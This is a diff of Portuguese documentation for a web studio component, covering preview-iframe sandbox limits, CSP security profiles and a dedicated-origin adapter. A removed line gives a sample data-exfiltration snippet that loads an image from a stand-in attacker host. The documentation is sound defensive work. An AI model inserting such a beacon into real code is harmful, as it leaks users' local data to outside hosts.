@@ -116,8 +116,8 @@ CSP, se o host usa uma: o terminal precisa de `script-src 'unsafe-eval' 'wasm-un
 ## 6. Limitações conhecidas
 
 - Multi-instância funciona (stores por instância), MAS: o WebContainer é singleton por aba e o atalho de teclado da busca de blocos fica com a última instância montada. Como o container é singleton, apenas UMA instância (não-profissional) pode usar o Terminal por aba — uma segunda mostra "Terminal já está em uso em outra instância nesta aba" em vez de sobrescrever os arquivos da primeira (namespacing por instância sob `/sz-<id>/` é item de backlog).
-- **Preview é de MESMA THREAD (modo não-profissional):** o iframe `srcdoc` null-origin compartilha a thread principal do host. O guarda de laços corta loops síncronos instrumentados, mas trabalho síncrono pesado que NÃO é laço (`Array.from({length: 1e10})`, `JSON.parse` gigante, ReDoS, recursão profunda) congela a thread e o watchdog só DETECTA — não interrompe. Remédio definitivo: servir o preview de outra origem (cross-origin/cross-process), hoje só no modo profissional.
-- **CSP do preview deixa um canal residual de exfil por GET de mão única:** por design `img/media/font/frame-src` liberam `https:` (com `connect-src 'none'`), então código de um projeto compartilhado/importado pode vazar dados locais do preview via `new Image().src = 'https://attacker/?'+dado`. A origem nula impede LER qualquer resposta. Hosts blindados podem, como backlog, optar por zerar esses subresources `https:`.
+- **Preview do editor é de MESMA THREAD:** o iframe `srcdoc` null-origin compartilha a thread principal do host. O guarda de laços corta loops síncronos instrumentados, mas trabalho síncrono pesado que NÃO é laço (`Array.from({length: 1e10})`, `JSON.parse` gigante, ReDoS, recursão profunda) congela a thread e o watchdog só DETECTA — não interrompe. No player público, configure `originAdapter` para navegar a uma origem/processo dedicado; o editor criativo continua local por compatibilidade.
+- **O perfil `creative` mantém o canal residual de GET passivo:** ele libera `https:` em `img/media/font/frame-src` para o ambiente de criação. O `StudioProjectPlayer` usa `strict` por padrão e fecha esse canal; só reabra com `securityProfile="creative"` quando o conteúdo publicado realmente depender de recursos externos.
 - **Tema do Monaco é GLOBAL por página** (consequência do namespace único do Monaco — há um só tema ativo via `monaco.editor.setTheme`). Duas instâncias simultâneas em Código/Ponte (ex.: rota `/dual`) acabam adotando o ÚLTIMO tema definido; não há isolamento de tema por instância no Monaco. O Blockly, ao contrário, aplica tema por workspace. (Os models, esses sim, são isolados por instância: o `path` é salgado com um id estável por instância.)
 - Settings (tema via toggle, fonte do código, chave BYOK) são preferência do USUÁRIO, compartilhada entre instâncias e persistida em IndexedDB.
 - O smoke obrigatório na primeira integração Next/Turbopack: modo Código (autocomplete = workers do Monaco) e modo Ponte (digitar HTML → blocos = worker de reverse-parse). Se o worker `.ts` relativo falhar no bundler do host, ver plano B no CLAUDE.md (factory injetável).
@@ -212,6 +212,30 @@ import { StudioProjectPlayer } from '@sistemazero/studio/player' // dynamic ssr:
 <StudioProjectPlayer project={projetoBuscadoDoServidor} />       // roda SÓ o jogo, autostart
 ```
 
+O player público usa `securityProfile="strict"` por padrão: imagens, fontes, mídia, CSS e iframes
+remotos ficam bloqueados, além de fetch/XHR. Projetos públicos que dependam deliberadamente de
+recursos externos podem optar por `securityProfile="creative"`.
+
+Para isolar também CPU/processo, o host pode publicar o documento numa origem dedicada:
+
+```tsx
+const originAdapter = {
+  async createPreviewUrl({ document, signal }) {
+    const response = await fetch('/api/preview-runs', { method: 'POST', body: document, signal })
+    if (!response.ok) throw new Error('Falha ao criar preview isolado')
+    return (await response.json()).url // URL HTTP(S) em OUTRA origem
+  },
+  releasePreviewUrl(url) {
+    void fetch('/api/preview-runs', { method: 'DELETE', body: JSON.stringify({ url }) })
+  },
+}
+
+<StudioProjectPlayer project={projeto} originAdapter={originAdapter} />
+```
+
+Com o adaptador, o iframe usa `src`; sem ele, preserva o `srcDoc` de origem opaca. URLs de mesma
+origem, `data:` e `blob:` são recusadas pelo contrato.
+
 Também exportado no index principal (`StudioProjectPlayer` + a função assíncrona pura
 `renderProjectToPreviewDocAsync(project): Promise<string>`, caso o host queira montar o srcdoc por
 conta própria):
@@ -228,4 +252,5 @@ que antes passava o retorno diretamente para `srcDoc` precisa usar `await` e pre
 A função tolera `files` ausente e `installedExtensions`/`extraFiles`/`assets` não-array, usando defaults
 vazios para não quebrar páginas públicas antigas. O iframe usa
 `sandbox="allow-scripts allow-modals allow-pointer-lock"`, `allow="fullscreen"`, e a CSP/guards viajam
-dentro do doc — o host só precisa de `frame-src 'self' blob:` na própria CSP.
+dentro do doc. Sem adaptador, o host precisa permitir o iframe local; com adaptador, `frame-src` da
+CSP do host deve listar somente a origem dedicada de preview.
